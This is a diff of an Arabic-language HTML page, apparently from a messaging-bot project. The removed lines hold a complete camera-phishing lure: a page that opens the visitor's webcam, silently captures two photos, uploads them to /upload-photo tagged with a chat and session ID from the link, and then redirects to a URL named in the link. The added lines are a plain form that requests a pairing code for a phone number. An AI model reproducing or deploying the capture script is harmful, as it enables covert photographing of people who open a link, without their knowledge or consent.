@@ -2,90 +2,45 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>📸 التقاط الصور</title>
+  <title>توليد رمز الاقتران - طرزان الواقدي</title>
   <style>
-    body {
-      margin: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
-    }
-    video {
-      width: 320px;
-      border-radius: 10px;
-      margin-bottom: 20px;
-      border: 2px solid #38bdf8;
-    }
-    .loader {
-      width: 100px;
-      height: 100px;
-      border: 10px solid #333;
-      border-top: 10px solid #38bdf8;
-      border-radius: 50%;
-      animation: spin 2s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
-    }
+    body { font-family: Arial, sans-serif; text-align: center; background: #111; color: #fff; padding: 50px; }
+    input, button { padding: 10px; margin: 10px; border-radius: 5px; }
+    button { background: #38bdf8; color: #fff; border: none; cursor: pointer; }
+    button:hover { background: #0ea5e9; }
+    .code { font-size: 24px; color: #0f0; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <h1>📸 جارٍ الالتقاط... انتظر</h1>
-  <div class="loader"></div>
-  <video autoplay playsinline></video>
+  <h1>🔐 توليد رمز الاقتران</h1>
+  <input type="text" id="sessionId" placeholder="معرف الجلسة" />
+  <input type="text" id="phone" placeholder="رقم الهاتف مع كود الدولة" />
+  <button onclick="generateCode()">إنشاء الرمز</button>
+  <div class="code" id="code"></div>
 
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect');
-    const chat = params.get('chat');
-    const sessionId = params.get('sessionId');
-    const video = document.querySelector('video');
+    async function generateCode() {
+      const sessionId = document.getElementById('sessionId').value.trim();
+      const phone = document.getElementById('phone').value.trim();
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
+      if (!sessionId || !phone) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+      }
 
-        setTimeout(() => capturePhoto(false), 2000);
-        setTimeout(() => capturePhoto(true), 4000);
-
-        function capturePhoto(isLast) {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(async blob => {
-            const formData = new FormData();
-            formData.append('photos', blob, `photo-${Date.now()}.png`);
-            formData.append('chat', chat);
-            formData.append('sessionId', sessionId);
-
-            try {
-              await fetch('/upload-photo', { method: 'POST', body: formData });
-            } catch (err) {
-              alert('❌ فشل إرسال الصورة: ' + err.message);
-            }
-
-            if (isLast) {
-              stream.getTracks().forEach(track => track.stop());
-              document.body.innerHTML = `<h2 style="color:#0f0;">✅ تم الالتقاط! سيتم تحويلك...</h2>`;
-              setTimeout(() => {
-                window.location.href = redirectUrl || '/';
-              }, 2000);
-            }
-          }, 'image/png');
-        }
-      })
-      .catch(err => {
-        alert('❌ فشل في الوصول للكاميرا: ' + err.message);
+      const res = await fetch('/create-session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId, phone })
       });
+
+      const data = await res.json();
+      if (data.pairingCode) {
+        document.getElementById('code').innerText = `✅ رمز الاقتران: ${data.pairingCode}`;
+      } else {
+        alert(data.error || data.message);
+      }
+    }
   </script>
 </body>
 </html>
